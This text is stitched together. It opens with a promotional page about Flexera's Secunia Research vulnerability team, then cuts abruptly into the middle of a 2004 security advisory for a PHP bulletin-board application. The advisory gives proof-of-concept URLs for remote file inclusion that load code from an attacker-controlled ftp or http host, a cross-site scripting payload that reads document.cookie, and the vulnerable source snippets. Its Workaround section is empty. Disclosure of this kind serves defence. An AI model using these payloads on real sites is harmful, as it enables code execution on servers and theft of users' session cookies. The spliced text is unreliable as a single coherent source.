How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

2004-12-13 STG Security, Inc. customer notified.
2004-12-24 Official release.

Details
=======
Vulnerability 1 : PHP source injection vulnerability
- - ------------------------------------
- - - Proof of concept
http://[victim]/outlogin.php?_zb_path=ftp://[attacker]/pub/

- - - Environment
PHP 5.0.x
php.ini : register_globals = On

- - - Description
As of PHP 5.0.0, file_exists() can be used with URL wrappers explained at
<http://www.php.net/manual/en/function.file-exists.php>. Thus _zb_path
parameter in outlogin.php can be easily exploited.

- - - Part of vulnerable source, outlogin.php.
- - ----
// &#51228;&#47196;&#48372;&#46300; &#46356;&#47113;&#53664;&#47532; &#51064;&#51648; \
&#52404;&#53356; if(!file_exists($_zb_path."lib.php")) {
  echo "&#51228;&#47196;&#48372;&#46300; &#46356;&#47113;&#53664;&#47532;&#44032; \
&#50500;&#45785;&#45768;&#45796;";  return;
}

// _head.php &#51069;&#51020;
@include $_zb_path."_head.php";

}
- - ----

Vulnerability 2 : PHP source injection vulnerability
- - ------------------------------------
- - - Proof of concept
http://[victim]/include/write.php?dir=http://[attacker]/

- - - Environment
php.ini: register_globals = On

- - - Reason
Uninitialized $dir variable in write.php

- - - Part of vulnerable source, include/write.php
- - ----
include $dir."/write.php";
- - ----

Vulnerability 3 : Cross-site scripting vulnerability
- - --------------------------------------
- - - Proof of concept
http://[victim]/check_user_id.php?user_id=&lt;script&gt;alert(document.cookie)</sc
ript>

- - - Reason
check_user_id.php doesn't validate the input value of user_id.

- - - Part of vulnerable source, check_user_id.php
- - ----
$user_id = trim($user_id);
... &#49373;&#47029; ...
if($check[0]) echo "$user_id &#45716; &#51060;&#48120; &#46321;&#47197;&#46108;<br> \
&#50500;&#51060;&#46356;&#51077;&#45768;&#45796;"; else echo"$user_id &#45716; \
                &#49324;&#50857;&#54616;&#49892;&#49688; \
                &#51080;&#49845;&#45768;&#45796;";
... &#49373;&#47029; ...
- - ----

Workaround
==========
